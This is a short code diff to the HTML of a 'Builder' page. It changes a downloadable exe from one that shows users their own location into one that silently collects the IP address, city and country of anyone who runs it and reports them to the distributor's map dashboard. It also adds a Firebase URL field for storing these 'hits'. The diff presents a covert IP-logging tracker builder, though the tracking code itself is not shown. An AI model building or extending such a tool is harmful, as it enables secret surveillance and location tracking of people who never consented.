@@ -86,7 +86,16 @@
           <div class="hello">
             <div class="eyebrow">Builder</div>
             <h1>Build something</h1>
-            <p>Name it, build it, download it. When you run the exe, it uses your IP address to find your city and coordinates, displays them in a window, then fades away. Your name is baked into every download.</p>
+            <p>When someone runs your exe, it silently grabs their IP and location, then sends it back to your dashboard map — showing a red pin for every person who ran it. Click any pin to see their IP, city, and country.</p>
+          </div>
+
+          <div class="panel">
+            <h3>Firebase URL</h3>
+            <p class="desc">This is where hits get stored. Paste your Firebase Realtime Database URL here (e.g. <code style="color:var(--cyan);font-size:11px;">yourproject-default-rtdb.firebaseio.com</code>). Without this, the exe won't report back.</p>
+            <div class="input-row">
+              <input type="text" class="text-input" id="firebase-url" placeholder="yourproject-default-rtdb.firebaseio.com" style="min-width:320px;" />
+              <button class="btn" id="firebase-save-btn">Save</button>
+            </div>
           </div>
 
           <div class="panel">
